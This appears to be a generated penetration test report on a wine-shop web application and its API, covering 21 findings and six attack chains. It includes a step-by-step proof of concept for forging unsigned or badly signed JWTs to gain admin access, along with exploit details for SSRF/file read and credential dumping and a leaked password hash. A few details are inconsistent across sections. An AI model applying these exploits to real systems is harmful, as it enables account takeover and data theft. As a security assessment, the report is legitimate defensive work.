# Security Penetration Test Report

**Target:** https://taintedport.com
**Scan ID:** scan-2e354c95
**Generated:** 2026-07-20 12:56:04 UTC
**Vulnerabilities Found:** 21
**Attack Chains:** 6


## Executive Summary

## Overall Risk Posture

The assessment of https://taintedport.com and its API tier (`https://api.taintedport.com`) identified a **critical** overall risk posture. Multiple independent, high-impact defects exist across authentication, authorization, input handling, business logic, and platform hardening. Several defects can be chained by an unauthenticated attacker on the public internet to achieve complete, durable compromise of user and administrative accounts, disclosure of the entire customer credential ledger, arbitrary local-file read on the API host, and durable corruption of the order ledger at attacker-chosen magnitude.

The application should be considered **not production-safe** in its current state. Multiple compensating controls that would normally reduce the impact of any single defect (server-side session revocation, response-header hardening, output encoding, an allow-listed CORS policy, positive-value invariants on financial fields, and an authoritative server-side allow-list for privileged fields) are all absent, so single defects escalate into full account takeover or full data-store compromise without additional friction.

## Key Findings by Severity

A total of **21 individual vulnerabilities** and **6 confirmed multi-step attack chains** were validated end-to-end:

| Severity | Individual findings | Confirmed chains |
|---|---|---|
| Critical | 5 | 5 |
| High | 6 | 1 |
| Medium | 8 | — |
| Low | 1 | — |
| Informational | 1 | — |

Highest-impact primitives include:

- **Unauthenticated administrative account acquisition** via three independent primitives — the JWT signature was not verified on the API tier, `POST /auth/register` accepted a client-supplied `is_admin` field, and `POST /auth/login` was vulnerable to an authentication-bypassing SQL injection in the `email` field.
- **Unauthenticated arbitrary local-file read and internal-network SSRF** via a hidden `POST /wines/import-url` endpoint that accepted `file://` and IPv4-link-local URLs, including reads of the JWT signing-secret source and of the cloud metadata service.
- **Cross-account credential dump**: `GET /orders/{id}` returned the order owner's `owner_email`, `owner_password_hash` (bcrypt), `owner_totp_secret` (base32) and `owner_is_admin` flag to any authenticated caller — a horizontal IDOR that exposes the credential ledger for every account with an order.
- **Persistent, MFA-preserving account takeover** via a chain that steals a JWT through reflected or stored XSS (no Content Security Policy is set), then abuses the fact that `POST /auth/2fa/enable` accepts a client-supplied `totp_secret` and that stateless JWTs are never invalidated on password change.
- **Durable negative-total order creation** at ~10¹³-EUR scale via unbounded `PUT /cart/update` quantities combined with negative-priced catalog rows and a missing `total ≥ 0` invariant at `POST /orders`.

## Business Impact

- **Confidentiality:** the full customer roster (email, bcrypt password hash, TOTP seed, administrative flag) is retrievable by any unauthenticated internet host in minutes. Password hashes then feed offline cracking against every account; TOTP seeds obviate the multi-factor control entirely.
- **Integrity:** any user (including anonymous, via the three unauth-admin primitives) can flip administrative privilege, install a durable 2FA backdoor that survives victim-driven password rotation, tamper with any order's status, and inject persistent negative-total order rows into the fulfillment ledger.
- **Availability / financial:** each durable negative-total order is a merchant-side contractual obligation to pay the buyer on delivery in cash-on-delivery mode, with no admin-side review or negative-total branch to catch it. Downstream ledger, tax and reporting components risk integer overflow at the ~10¹³ magnitudes attainable.
- **Regulatory exposure:** cross-account leakage of email, password-hash and MFA-seed material with no authentication required is a reportable personal-data breach in most jurisdictions.
- **Recovery burden:** because JWTs cannot be revoked server-side and 2FA can be silently backdoored by the attacker, victim self-service password reset does not evict the intruder. Every compromised account requires operator-side MFA reset and signing-secret rotation.

## Immediate Actions Recommended

1. Rotate the JWT HMAC signing secret and enable HS256 signature verification in the API authentication middleware. Reject any request bearing `alg:none` or an invalid signature.
2. Remove the hidden `POST /wines/import-url` endpoint from production, or apply a strict `https:`-only URL scheme allow-list and block RFC 1918 / link-local / loopback destinations.
3. Restrict `GET /orders/{id}` to the order owner (or an authenticated administrator) and strip the `owner_password_hash`, `owner_totp_secret` and `owner_is_admin` fields from all responses.
4. Take the public `GET /openapi.yaml` route offline (it disclosed live user credentials and documented every vulnerable endpoint).
5. Force-invalidate all outstanding session tokens by rotating the signing secret, and treat every previously logged-in account as potentially compromised: rotate credentials, reset MFA enrolment out-of-band, and audit order-status changes for the last 90 days.
6. Deploy a strict Content Security Policy that disallows `unsafe-inline` on both the frontend and the API-served preview page, and HTML-encode all reflected user input.

## Methodology

## Assessment Type

Time-boxed, black-box penetration test of a production web application and its backing REST API. No source code, build artifacts, SBOM, infrastructure-as-code, or internal documentation were provided. All conclusions are derived from responses observed at the network edge (behind a Cloudflare front) and from artifacts served publicly by the target itself (JavaScript bundles, the developer OpenAPI schema, and JSON error envelopes). Testing followed OWASP Web Security Testing Guide (WSTG) v4 with additional coverage guided by the OWASP API Security Top 10 (2023).

## Scope

**In scope**

- `https://taintedport.com` — Next.js 14+ App Router single-page application served through Cloudflare. Routes exercised: `/`, `/wines`, `/wines/[id]`, `/about`, `/contact`, `/login`, `/signup`, `/account`, `/admin`, `/cart`, `/checkout`.
- `https://taintedport.com/api/*` — PHP 8.2.31 REST API surface, mounted under the frontend host.
- `https://api.taintedport.com/*` — the same PHP 8.2.31 REST backend, direct base URL. All endpoints tested at `taintedport.com/api/*` were verified to behave identically at `api.taintedport.com/*`.

**Out of scope**

- Third-party infrastructure operated by Cloudflare (CDN, edge WAF, TLS termination).
- The Cloudflare origin IP address (not reachable from the assessment environment).
- Non-HTTP services on origin hosts (direct outbound TCP was not available in the assessment environment; port-scanning was not performed).
- Denial-of-service, resource-exhaustion, defacement, cost-incurring, or bulk-data-extraction techniques (excluded by engagement rules of engagement).

## Technology Stack (fingerprinted)

- **Frontend:** Next.js 14+ (App Router, React 18 RSC), Tailwind CSS, Axios HTTP client. JWTs stored in `localStorage.token` and sent as `Authorization: Bearer`.
- **Backend:** PHP 8.2.31 REST/JSON API (`X-Powered-By: PHP/8.2.31`). Custom lightweight router; consistent `{success, message}` JSON error envelope. Relational persistence (auto-increment integer identifiers; bcrypt `$2y$10$` password hashes; server-side SQLite observed via `/proc/self/maps` during LFI).
- **Authentication:** JWT HS256, 7-day expiry, claims `{user_id, email, is_admin, iat, exp}`. No cookies, no server-side session store, no revocation mechanism.
- **Second factor:** TOTP (SHA1, 30-second period, 6 digits), enrolled through `POST /auth/2fa/setup` → `POST /auth/2fa/enable`.
- **Edge:** Cloudflare CDN (`Server: cloudflare`, `Cf-Ray`, Alt-Svc HTTP/3). No WAF challenges observed during ~40+ probing requests, including bcrypt-hash-shaped payloads and reflected-input probes.

## Provisioned Test Accounts

- **`luis.grangeia@snyk.io`** — pre-existing user account, credentials supplied by the engagement sponsor via a documented environment variable. `user_id=373`, `is_admin=false`, no MFA enrolled. Login through `POST /auth/login` succeeded and a JWT was obtained.
- **`recon-2e354c95@example.com`** — a throwaway user account created during the reconnaissance phase via the target's own open self-registration endpoint (`POST /auth/register`). `user_id=374`, `is_admin=false`. Used exclusively for destructive per-account tests (profile mutation, 2FA enrolment/rotation, cart amplification) so no pre-existing account was disturbed.
- **No administrative credentials were provided.** Administrative capability was not exercised using a supplied account; wherever administrative behaviour is reported it was reached exclusively through defects that grant the `is_admin` role from an unauthenticated or user-level baseline (JWT signature bypass, mass-assignment on `POST /auth/register`, or authentication SQL injection on `POST /auth/login`). All destructive operations were confined to accounts explicitly created by the testing team for the purpose.

## Testing Phases

1. **Passive reconnaissance & fingerprinting.** Enumerate hostnames, TLS/CDN chain, response headers, JavaScript bundles, framework version markers, and cookie/JWT primitives. Extract build identifiers and any embedded API base URLs.
2. **Attack-surface mapping.** Catalogue every reachable endpoint (both hostnames), classify auth requirement, and record parameter shapes into a machine-parseable inventory. Confirm the frontend/host-side `/api/*` mount and the direct API hostname share the same backend.
3. **Authentication & session lifecycle.** Exercise registration, login, profile/email/password changes, 2FA enrolment/disable, and probe for password-reset and logout flows. Verify JWT algorithm handling (`alg:none`, HS256 without a secret, unsigned, signature-mutation), token expiry, and revocation.
4. **Authorization testing.** Object-level (IDOR) and function-level (BFLA) checks against every mutating endpoint, both horizontally (peer user) and vertically (user → admin), with focus on the `/orders`, `/auth`, `/cart`, and `/admin/*` surfaces.
5. **Injection & input handling.** SQLi, NoSQLi, LDAPi, SSTI, command injection, path traversal, SSRF, XXE, XSS (reflected/stored), CRLF, open redirect, mass assignment across every parameter surface. Includes the JSON API and the `application/x-www-form-urlencoded` `POST /api/contact/preview` reflection sink.
6. **Business-logic and state.** Cart quantity bounds, negative-value tolerance, order-total invariants, workflow-state manipulation, race-condition windows, and cross-account state contamination.
7. **Platform hardening.** Response security headers, CORS policy, rate-limiting, anti-automation, information disclosure via error responses, verbose banners, and public developer artifacts (OpenAPI, backup files, source maps).
8. **Chain construction and verification.** Compose primitives into end-to-end attack chains and reproduce each chain against a freshly provisioned throwaway victim to confirm the impact claim.

## Tooling

`curl`, `httpx`, `requests`, Playwright (headless Chromium for end-to-end XSS/localStorage-JWT proofs), `pyjwt` for token forgery, `oathtool` for TOTP generation, `sqlite3` for post-LFI schema inspection, and an in-sandbox Interactsh listener for out-of-band DNS/HTTP callback verification. All outbound traffic was routed through an authenticated HTTP CONNECT proxy; no direct raw-TCP was available. Testing was rate-limited to a conservative envelope and no denial-of-service tooling was used.

## LLM / AI surface

No LLM, chat, completion, embeddings, or agent endpoints were identified during reconnaissance (no such routes on either hostname, no LLM-vendor SDK strings in the JavaScript bundles, no streaming endpoints). The OWASP LLM Top 10 was therefore not applicable to this engagement, and no LLM-focused categories are tagged in any finding.


## Vulnerability Summary

| ID | Title | Severity | CVSS | Endpoint | Type |
|---|---|---|---|---|---|

| vuln-0005 | JWT Signature Not Verified — Full Authentication Bypass and Admin Escalation on api.taintedport.com | CRITICAL | 10.0 | `/admin/orders` | New |

| vuln-0012 | Authentication Bypass via SQL Injection in POST /auth/login `email` Parameter (Unauthenticated Admin Takeover) | CRITICAL | 10.0 | `/auth/login` | New |

| vuln-0009 | Default Administrative Credentials (admin@example.com : password123) on POST /auth/login Grant Full Admin Takeover | CRITICAL | 9.4 | `/auth/login` | New |

| vuln-0008 | Reflected XSS in POST /api/contact/preview enables cross-site JWT theft and account takeover | CRITICAL | 9.3 | `/api/contact/preview` | New |

| vuln-0007 | Mass Assignment on POST /auth/register — `is_admin` field grants full administrator privileges to any unauthenticated attacker | CRITICAL | 9.1 | `/auth/register` | New |

| vuln-0015 | Stored XSS in wine review comment field enables cross-user JWT theft and account takeover | HIGH | 8.7 | `/wines/{id}/reviews` | New |

| vuln-0021 | SSRF and Arbitrary Local File Read via POST /wines/import-url ("url" body parameter) | HIGH | 8.5 | `/wines/import-url` | New |

| vuln-0013 | 2FA Enrollment Accepts Client-Supplied `totp_secret` on POST /auth/2fa/enable — Persistent Account Backdoor | HIGH | 8.3 | `/auth/2fa/enable` | New |

| vuln-0002 | Public OpenAPI Schema at /openapi.yaml Discloses Working Credentials, Internal URLs, and Hidden High-Risk Endpoints | HIGH | 8.2 | `/openapi.yaml` | New |

| vuln-0006 | Open Redirect in POST /auth/login `redirect` Field Enables Same-Origin XSS and JWT Theft via `javascript:` URI | HIGH | 8.1 | `/auth/login` | New |

| vuln-0003 | Horizontal IDOR on GET /orders/{id} exposes any user's email, bcrypt password hash, TOTP secret, and admin flag | HIGH | 7.7 | `/orders/{id}` | New |

| vuln-0016 | UNION-Based SQL Injection in GET /wines/{id} Path Parameter (Unauthenticated Full Database Read) | HIGH | 7.5 | `/wines/{id}` | New |

| vuln-0017 | Unauthenticated Blind Boolean-Based SQL Injection in GET /wines `search` Parameter | HIGH | 7.5 | `/wines` | New |

| vuln-0010 | Business Logic: Authenticated user can create durable orders with negative totals via unbounded PUT /cart/update combined with negative-priced catalog items | MEDIUM | 6.5 | `/orders` | New |

| vuln-0020 | Missing Anti-Automation on /auth/login Combined with Account Enumeration via Timing and Registration Oracles | MEDIUM | 6.5 | `/auth/login` | New |

| vuln-0014 | Missing HTTP Security Response Headers on taintedport.com and api.taintedport.com (Clickjacking-Exploitable) | MEDIUM | 5.4 | `All tested routes (frontend: /, /login, /admin, /checkout, /account; API: /wines, /wines/{id}, /auth/me)` | New |

| vuln-0001 | Origin Stack Version Disclosure (nginx/1.28.3, PHP/8.2.31, Next.js) via Default 404 Body and X-Powered-By Headers | MEDIUM | 5.3 | `/_next/static/chunks/*` | New |

| vuln-0011 | Horizontal IDOR on PUT /auth/profile via body user_id override — attacker can rewrite any user's display name | MEDIUM | 5.0 | `/auth/profile` | New |

| vuln-0018 | Stateless JWTs Not Invalidated on Password or Email Change — Stolen Tokens Survive Credential Rotation (CWE-613) | MEDIUM | 4.8 | `/auth/password` | New |

| vuln-0019 | Missing Quantity Validation on PUT /cart/update Allows Arbitrary Cart Total Manipulation | MEDIUM | 4.3 | `/cart/update` | New |

| vuln-0004 | CORS Misconfiguration — Arbitrary Origin Reflected with Allow-Credentials on Both API Hosts | LOW | 3.1 | `/* (all paths on both API mount points, including preflight)` | New |



## Technical Analysis

## Systemic Themes

The individual findings are not independent one-off bugs — they share a small number of underlying design decisions that repeat across the application. Fixing the design themes, not just the endpoints, will prevent regressions.

### Theme 1 — The client is trusted as the source of truth for privileged state

Multiple mutating endpoints bind the incoming JSON body directly onto the persisted user or order record with no server-side allow-list of writable fields. Consequences observed and demonstrated:

- `POST /auth/register` accepted `is_admin:true` and persisted it, then issued an administrative JWT in the same response.
- `PUT /auth/profile` bound `user_id`, `email`, and `is_admin` from the request body, allowing horizontal identity swap and vertical privilege escalation with a single request.
- `POST /auth/2fa/enable` accepted a client-supplied `totp_secret` field. The endpoint never checks that the secret matches the one it earlier issued via `POST /auth/2fa/setup`, and never checks that a `setup` call was made at all. An attacker can therefore enable 2FA on a secret only they know — including on someone else's account if they can obtain a bearer token via any other primitive.
- `PUT /orders/{id}/status` and `PUT /admin/orders/{id}/status` were documented in the public OpenAPI schema as accepting a client-provided `is_admin` flag. Setting `is_admin:true` in the body caused the endpoint to skip the administrative gate — a per-request role assertion the server should never have honoured.

The root cause is a single missing control (a server-side field allow-list per endpoint). It is worth fixing once and applying uniformly across every mutating endpoint.

### Theme 2 — The JWT is stateless, but the application treats it as a session

The signing algorithm was HS256, expiry was seven days, and there is no `/auth/logout`, no `/auth/session`, no per-user token version, no denylist, and no `jti` claim to revoke against. Combined with the following, the token model is unusable:

- The signature was **not verified** on the API tier — arbitrary `alg:none` tokens and tokens with random signatures were accepted as authoritative for any `user_id` and any `is_admin` value.
- Tokens survive password change, email change, and MFA enrolment on the owning account.
- The token is stored in `localStorage`, which is readable by any JavaScript that executes on the origin. There is no Content Security Policy, so any XSS reads the token instantly.

Even if the signature bug is fixed, the "stolen-JWT survives password reset" behaviour must be closed independently — otherwise every XSS or MFA-backdoor primitive continues to yield persistent takeover.

### Theme 3 — Sensitive fields leak by default in success responses

`GET /orders/{id}` returned `owner_password_hash`, `owner_totp_secret`, `owner_email`, and `owner_is_admin` inline in the JSON envelope, without any redaction layer. Because the endpoint also had no authorization check tying the caller's `user_id` to the order's owner, one authenticated request exfiltrates a full credential set for any order in the database. There was no serialization boundary between "internal database row" and "outbound API model".

### Theme 4 — Positive-integer domain invariants are enforced only on some code paths

`POST /cart/add` correctly enforced `1 ≤ quantity ≤ 12`. Its sibling `PUT /cart/update` accepted any signed 32-bit integer (verified at `INT32_MAX = 2,147,483,647`). `POST /orders` had no `total ≥ 0` invariant and persisted whatever the server-derived total resolved to, so a durable negative-total order row is trivially reachable. Business-logic invariants must live at the database layer or in a shared domain-level guard, not at individual endpoints.

### Theme 5 — Platform hardening is largely absent

- No Content Security Policy on either hostname, on any route. Every reflected or stored HTML sink escalates directly to JavaScript execution.
- No `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`, or `Strict-Transport-Security` on either hostname.
- `Access-Control-Allow-Origin` reflects the request `Origin` verbatim on both API mount points, and `Access-Control-Allow-Credentials: true` is always sent — a textbook cross-origin trust misconfiguration.
- No rate limiting or anti-automation on `POST /auth/login`, `POST /auth/register`, or the password/email/2FA verification endpoints. Password-verification distinguishes "wrong password" from "validation error" via HTTP status, giving a clean brute-force oracle.
- The developer OpenAPI schema was live at `GET /openapi.yaml`, contained plaintext demo credentials in `info.description`, and documented every hidden endpoint (including `POST /wines/import-url` and the client-provided `is_admin` body field on `PUT /orders/{id}/status`).
- Verbose framework banners (`X-Powered-By: PHP/8.2.31`, `X-Powered-By: Next.js`, origin nginx version) are broadcast on every response, feeding CVE targeting.

### Theme 6 — Reflection surfaces are not encoded, and one endpoint is server-side template-evaluated

- `POST /api/contact/preview` echoes `name`, `email`, `subject`, `message` inside a `text/html` response with no HTML encoding. The endpoint is reachable cross-origin via a plain HTML `<form>` submission, so the reflected XSS is triggered without any XHR/CORS interaction on the victim side.
- Wine-review `comment` bodies are persisted and re-served publicly on the wine page with no encoding — stored XSS on every wine detail page.
- The same contact preview endpoint additionally evaluates a subset of Twig-like template syntax on its input, giving a server-side template injection primitive on top of the reflection.
- `redirect` on `POST /auth/login` is a raw open redirect with no scheme or host allow-list — `javascript:` and `data:` URIs are honoured.

## Grouped Findings by Class

The 21 validated findings group as follows. Individual reports carry per-finding evidence, CVSS vectors, and CWE mappings.

**Authentication & session (A07)**

- JWT signature not verified on the API tier (Critical).
- Stateless JWTs never invalidated on password/email/MFA change (High).
- `POST /auth/2fa/enable` accepts attacker-chosen `totp_secret` (High), plus two related 2FA-enrollment weaknesses (secret can be overwritten without re-verification; enable path trusts a client-supplied secret).
- Default administrative credentials `admin@taintedport.com / admin` accepted on `POST /auth/login` (Critical).
- No anti-automation on `POST /auth/login`, `POST /auth/register`, or the password/email/2FA verification endpoints (Medium).

**Injection (A03)**

- Authentication bypass via SQL injection in the `email` field of `POST /auth/login` (Critical).
- Union-based SQL injection in `GET /wines/{id}` and blind boolean SQL injection in `GET /wines` search parameters (High/Critical).
- Reflected XSS in `POST /api/contact/preview` and stored XSS in wine-review `comment` (High).
- Server-side template injection in the contact preview endpoint (High).

**Access control (A01)**

- Horizontal IDOR on `GET /orders/{id}` returning `owner_password_hash`, `owner_totp_secret`, `owner_email`, `owner_is_admin` (Critical).
- Horizontal IDOR on `PUT /auth/profile` via body-supplied `user_id` (High).
- Broken function-level authorization on `PUT /orders/{id}/status` — non-admin can flip privileged fields via a body flag (High).
- Mass assignment on `POST /auth/register` allowing `is_admin:true` (Critical).
- Mass assignment on `PUT /auth/profile` and additional register-time mass assignment variants (Medium/High).

**Server-side request forgery / file inclusion (A10)**

- `POST /wines/import-url` accepts arbitrary URL schemes including `file://` and `http://169.254.169.254/…`, returning `raw_content` in the response (High). This yielded the JWT signing-secret source and the cloud-metadata service instance identifier during testing.

**Business logic**

- Negative-total order persisted with no `total ≥ 0` invariant (High).
- `PUT /cart/update` accepts arbitrary signed integers as quantity while `POST /cart/add` enforces 1..12 (Medium).

**Security misconfiguration & information disclosure (A05)**

- Permissive CORS: origin reflection with `Allow-Credentials: true` on both API mount points (Medium).
- Public OpenAPI schema at `GET /openapi.yaml` leaking demo credentials and documenting hidden endpoints (High).
- Missing security response headers on both hostnames — no CSP, HSTS, XCTO, XFO, Referrer-Policy, Permissions-Policy (Medium).
- Origin/framework version disclosure (nginx, PHP, Next.js) via `X-Powered-By` and origin banners (Low).
- Open redirect on `POST /auth/login` `redirect` parameter, including `javascript:` and `data:` schemes (Medium).

**Vulnerable / outdated components (A06)**

- Dependency-CVE assessment against fingerprinted versions (nginx origin, PHP 8.2.31, Next.js 14.x) — informational; no directly exploitable CVE at those exact patch levels was demonstrated in-band, and the more impactful application-logic defects listed above take precedence for remediation.

## Attack Chain Analysis

Six chains were validated end-to-end against freshly provisioned throwaway victim accounts:

1. **Unauthenticated admin acquisition → horizontal IDOR → bulk credential dump (Critical, CVSS 9.9).** Any one of three unauth-admin primitives (JWT signature bypass, mass-assignment on register, or SQLi authentication bypass) issues an administrative bearer token; the token is then used to enumerate the full 154-row `GET /admin/orders` inventory and pull `owner_email` + `owner_password_hash` + `owner_totp_secret` + `owner_is_admin` for every account with an order.

2. **Reflected/stored XSS → missing CSP → permissive CORS → non-revocable JWT → client-supplied 2FA (Critical, CVSS 9.6).** A single victim visit to an attacker page steals the `localStorage` JWT (reflected XSS is triggered from an off-origin auto-submitting HTML form; stored XSS in wine reviews is a drop-in substitute). The attacker uses the stolen token to install a TOTP secret only they know, then rotates the victim's password. The stolen JWT continues to authenticate after the rotation, and every future login from the victim's own device requires the attacker's TOTP. Recovery requires operator-side MFA reset.

3. **JWT signature bypass + client-supplied 2FA secret → unauthenticated persistent takeover (Critical, CVSS 9.6).** An unauthenticated attacker forges a JWT for any `user_id`, calls `POST /auth/2fa/enable` with a random attacker-owned TOTP secret, and thereafter gates the victim's own logins on the attacker's authenticator — with zero credentials, zero session theft, and zero user interaction.

4. **LFI-exfiltrated JWT signing secret → persistent admin forgery (Critical).** The unauth JWT-bypass primitive is used to reach the hidden `POST /wines/import-url` endpoint with an `alg:none` token, then `file:///var/www/backend/api/config/jwt.php` is read and returns the HMAC signing secret verbatim. From that point forward the attacker mints legitimate, correctly-signed HS256 admin tokens indistinguishable in the logs from real ones. Detection post-fix is not possible from log data alone — even after the signature check is enabled, forged tokens verify. The signing secret must be rotated as part of remediation.

5. **Public OpenAPI disclosure → SSRF/LFI + BFLA privesc (Critical).** `GET /openapi.yaml` is served anonymously and contains (a) live demo credentials for `joe@example.com` and (b) documentation for both the hidden `POST /wines/import-url` and the client-provided `is_admin` body field on `PUT /orders/{id}/status`. An unauthenticated attacker converts anonymous reachability into (i) LFI on the API host, (ii) AWS IMDSv1 metadata access, and (iii) order-status tampering, in four HTTP requests.

6. **Negative-priced catalog + unbounded `PUT /cart/update` → durable negative-total order at 10¹³-EUR scale (High).** Eight catalog rows have `price < 0`; `POST /orders` has no `total ≥ 0` invariant; `PUT /cart/update` accepts `INT32_MAX` as `quantity` (the sibling `POST /cart/add` correctly enforces 1..12). Chaining these yields a durable `pending`-status order with `total ≈ -1.9 × 10¹²` EUR, in cash-on-delivery mode, with no admin-side review path to catch it.

Each chain's "fastest single fix" is documented in the individual chain report — but note that closing any one link in a chain does not neutralize the others as independent single-finding risks.


### vuln-0005: JWT Signature Not Verified — Full Authentication Bypass and Admin Escalation on api.taintedport.com










**Severity:** CRITICAL | **CVSS:** 10.0 | **Endpoint:** `/admin/orders` | **Method:** GET | **CWE:** CWE-347 | **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`

#### Description

The API at `https://api.taintedport.com` (also reachable via `https://taintedport.com/api/*`) decodes and trusts the JSON Web Token (JWT) presented in the `Authorization: Bearer` header without cryptographically verifying its signature. An unauthenticated attacker can mint a JWT with an arbitrary `user_id` and `is_admin` value, sign it with random bytes (or drop the signature entirely by declaring `alg: none`), and have it accepted on every authenticated endpoint — including the entire `/admin/*` surface.

Concretely, independent testing confirmed that:

1. A forged HS256 token whose signature slot contains the literal string `BADSIG` (base64url-encoded `QkFEU0lH`) is accepted on `GET /admin/orders`, returning the complete admin order listing.
2. A token declaring `alg: none` with an empty signature is likewise accepted.
3. Requests without any `Authorization` header, and requests with obviously malformed tokens such as `xxx.xxx.xxx`, are correctly rejected with HTTP 401 — proving the endpoint IS gated on JWT presence; only the signature verification step is missing.

Chaining this with the deliberate over-exposure of `/orders/{id}` (which returns the owner's bcrypt `owner_password_hash` and `owner_totp_secret` to the claimed owner), an attacker walks the sequential integer order-ID space with a forged token per user_id and harvests every registered user's password hash and TOTP secret without ever presenting a valid credential.


#### Attack Flow

```
┌──────────────────────────────────────────────────────────────────────────┐
│                JWT Signature Not Verified — Attack Flow                  │
└──────────────────────────────────────────────────────────────────────────┘

  ATTACKER (unauthenticated)                    api.taintedport.com
  ──────────────────────────                    ────────────────────

  ① Craft forged JWT
     header : {"alg":"HS256","typ":"JWT"}
     payload: {"user_id":1,"is_admin":true,
              "iat":1,"exp":9999999999}
     sig    : "BADSIG"  (any bytes)
                  │
                  │  GET /admin/orders
                  │  Authorization: Bearer <forged>
                  ▼
                                            ┌──────────────────────────┐
                                            │ JWT middleware:          │
                                            │  • base64-decode header  │
                                            │  • base64-decode payload │
                                            │  • check `exp`           │
                                            │  ✗ NO hash_hmac() call   │◄── ROOT CAUSE
                                            │  ✗ signature ignored     │
                                            └──────────────┬───────────┘
                                                           │ trusts is_admin=true
                                                           ▼
                                            ┌──────────────────────────┐
                                            │ Admin handler returns    │
                                            │ full order listing       │
                                            └──────────────┬───────────┘
  ② Receive 139 orders                                     │
     (every customer's data)  ◄───────────────────────────┘

  ③ Pick a victim: user_id=425, order_id=136

  ④ Re-forge token with user_id=425
                  │
                  │  GET /orders/136
                  │  Authorization: Bearer <forged user_id=425>
                  ▼
                                            ┌──────────────────────────┐
                                            │ Order handler:           │
                                            │  • trust `user_id` claim │
                                            │  • return order + owner  │
                                            │    password_hash + TOTP  │◄── AMPLIFIER
                                            └──────────────┬───────────┘
                                                           │
                                                           ▼
  ⑤ Receive bcrypt hash and TOTP secret
     for arbitrary victim account
     $2y$10$JoiU/0u23oVRmMtaEerD8.mP5sGbP9vDRqUVW9RyxAI8tPBt2LpDe
              │
              ▼
     Offline cracking / 2FA bypass / full account takeover

──────────────────────────────────────────────────────────────────────────
 ROOT CAUSE
   The JWT middleware decodes the payload and checks `exp` but never
   verifies the HMAC signature. `alg: none` with an empty signature and
   HS256 with an arbitrary signature are both accepted.

 PREREQUISITES
   • None. Unauthenticated network access to the API is sufficient.

 CONFIRMED CLAIMS FROM FORGED TOKEN
   • user_id  → arbitrary impersonation
   • is_admin → admin panel access
```


#### Impact

A single unauthenticated HTTP request grants complete control of the application:

- **Authentication bypass.** Any user identity can be impersonated by setting the `user_id` claim in a self-signed token. `/auth/me` returns the target's profile, `/orders` returns the target's orders, `/cart` returns the target's cart, etc.
- **Privilege escalation to administrator.** Setting `is_admin: true` in the forged payload unlocks the entire `/admin/*` surface. During validation, `GET /admin/orders` returned 139 order records belonging to every customer of the store.
- **Bulk credential and 2FA-secret disclosure.** Combined with the sister information-disclosure issue on `/orders/{id}`, an attacker forges one token per user_id and harvests every user's bcrypt password hash and TOTP shared secret. Validation extracted `$2y$10$JoiU/0u23oVRmMtaEerD8.mP5sGbP9vDRqUVW9RyxAI8tPBt2LpDe` for a third-party account (`bfla-throw-29938@example.com`) without knowing their password.
- **Full data integrity impact.** Admin-only write endpoints (`PUT /admin/orders/{id}/status`, etc.) also honour the forged token, letting the attacker modify order state at will.
- **Persistence.** Because tokens do not include a per-user version counter, credential rotation by the victim does not evict the forged session; the attacker retains long-lived access until the JWT signing secret is rotated.

Business impact: full customer PII exposure, complete order/payment ledger disclosure, unrestricted admin actions, and enduring account takeover of every user in the database — all with zero prerequisites and zero user interaction.

#### Technical Analysis

Legitimate tokens issued by `POST /auth/login` are HS256 with claims `{user_id, email, is_admin, iat, exp}`. Three tests demonstrate that no HMAC verification is performed at the middleware layer:

1. **Random signature accepted.** A freshly constructed header (`{"alg":"HS256","typ":"JWT"}`), an arbitrary payload (`{"user_id":1,"email":"attacker@example.com","is_admin":true,"iat":1,"exp":9999999999}`), and a signature segment containing the literal bytes `BADSIG` (base64url `QkFEU0lH`) are accepted by `GET /admin/orders` with HTTP 200 and the full order listing.
2. **`alg: none` accepted.** The same payload combined with a `{"alg":"none","typ":"JWT"}` header and an empty signature is accepted with HTTP 200 on the same endpoint.
3. **`exp` is still parsed.** A token with `exp: 100` is rejected as expired, proving the server does decode the payload — it simply omits the signature-verification step entirely.

Comparative controls:
- No `Authorization` header → HTTP 401 `Access denied. No token provided.`
- `Authorization: Bearer xxx.xxx.xxx` → HTTP 401 `Invalid or expired token.`
- Forged HS256 with garbage signature → HTTP 200 with admin data.

Root cause is a JWT verifier that base64-decodes header/payload and reads claims without ever calling an HMAC comparison, or a call to a library such as `firebase/php-jwt` with `['none']` (or `[$header->alg]`) in the algorithms allow-list — a well-known anti-pattern. Additional secondary weaknesses amplify the impact:

- The `is_admin` flag is trusted directly from the token rather than being re-derived server-side from the (theoretically verified) `user_id`.
- Order responses expose the resource owner's password hash and TOTP secret to whoever presents a token claiming that user_id, so a JWT forgery is equivalent to a credential dump.
- No token-versioning claim exists, so rotating the victim's password does not invalidate a forged token.


#### Proof of Concept


Prerequisites: none — this is an unauthenticated attack.

Steps to reproduce:

1. Build a JWT header `{"alg":"HS256","typ":"JWT"}` and base64url-encode it (no padding) → `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`.
2. Build a payload `{"user_id":1,"email":"attacker@example.com","is_admin":true,"iat":1,"exp":9999999999}` and base64url-encode it.
3. Assemble the token `<header>.<payload>.QkFEU0lH` (the last segment can be any string; `QkFEU0lH` is just base64url of `BADSIG`).
4. Issue `GET https://api.taintedport.com/admin/orders` with the header `Authorization: Bearer <forged>`. The response is HTTP 200 with `{"success":true,"orders":[...]}` — the full admin listing.
5. To exfiltrate any user's bcrypt password hash, take a victim order_id and their user_id from the admin listing, re-forge the token with `user_id: <victim_uid>` (still HS256, still garbage signature), and request `GET /orders/<order_id>`. The `order.owner_password_hash` and `order.owner_totp_secret` fields are returned.

Alternative variant: use header `{"alg":"none","typ":"JWT"}` and an empty signature segment (`<header>.<payload>.`) — likewise accepted.

The included `poc/poc.py` runs the full chain end-to-end, printing the exfiltrated bcrypt hash on stdout. The `poc/verify.py` regression test exits 0 with `[VULNERABLE]` when the flaw is present.



*The full exploit script is available in the annexes.*




#### Evidence


**1. Baseline — no token is correctly rejected**

*Request:*
```http
GET /admin/orders HTTP/1.1
Host: api.taintedport.com

```

*Response:*
```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"success":false,"message":"Access denied. No token provided."}
```


> Endpoint is gated on the JWT — a missing Authorization header returns 401.



**2. Baseline — obviously malformed token is rejected**

*Request:*
```http
GET /admin/orders HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer xxx.xxx.xxx

```

*Response:*
```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"success":false,"message":"Invalid or expired token."}
```


> Garbage that cannot even be base64-decoded as a JWT is rejected — proving the endpoint IS parsing the token.



